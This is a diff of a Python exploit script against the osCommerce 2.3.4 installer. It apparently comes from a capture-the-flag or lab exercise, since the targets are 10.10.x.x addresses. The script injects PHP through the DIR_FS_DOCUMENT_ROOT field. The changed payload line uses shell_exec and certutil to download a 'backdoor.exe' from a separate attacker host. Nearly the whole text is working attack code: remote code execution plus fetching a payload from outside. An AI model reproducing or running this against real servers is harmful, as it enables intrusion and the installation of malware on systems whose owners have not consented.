@@ -14,8 +14,8 @@
 import requests
 
 # enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
-base_url = "http://10.10.179.10:8080/oscommerce-2.3.4/catalog/"
-target_url = "http://10.10.179.10:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
+base_url = "http://10.10.100.211:8080/oscommerce-2.3.4/catalog/"
+target_url = "http://10.10.100.211:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
 
 data = {
     'DIR_FS_DOCUMENT_ROOT': './'
@@ -26,7 +26,7 @@ data = {
 # so the format for the exploit will be: '); PAYLOAD; /*
 
 payload = '\');'
-payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.9.26.67:8000/backdoor2.exe backdoor2.exe");'    # this is where you enter you PHP payload
+payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.9.26.67:8000/backdoor.exe backdoor.exe");'    # this is where you enter you PHP payload
 payload += "echo $var;"
 payload += '/*'
 
